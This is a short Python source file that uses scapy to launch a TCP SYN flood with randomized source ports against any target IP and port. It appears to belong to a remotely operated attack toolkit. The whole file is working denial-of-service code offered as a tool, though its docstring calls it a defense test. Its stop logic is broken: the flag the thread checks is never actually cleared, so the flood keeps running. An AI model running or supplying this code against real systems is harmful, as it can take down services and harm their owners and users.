import threading
from scapy.all import send, RandShort, conf
from scapy.layers.inet import IP, TCP
from Server.core.remote_output import remote_print

def start_syn_flood(target_ip: str, target_port: int = 80, iface: str = None):
    """
    Floods a target IP/port with TCP SYN packets from randomized source ports
    to saturate connection tables and test transport layer defenses.
    """
    target_iface = iface or conf.iface
    remote_print(f"[RED] Starting TCP SYN Flood against {target_ip}:{target_port}...")

    is_running = True

    def flood_loop():
        while is_running:
            try:
                # Randomize source port to simulate multiple unique clients connecting
                pkt = IP(dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags="S")
                send(pkt, iface=target_iface, verbose=False)
            except Exception:
                pass

    # Launch worker thread
    worker = threading.Thread(target=flood_loop, daemon=True)
    worker.start()

    input("Press Enter to stop SYN Flood...\n")
    is_running = False
    remote_print("[+] SYN Flood stopped.")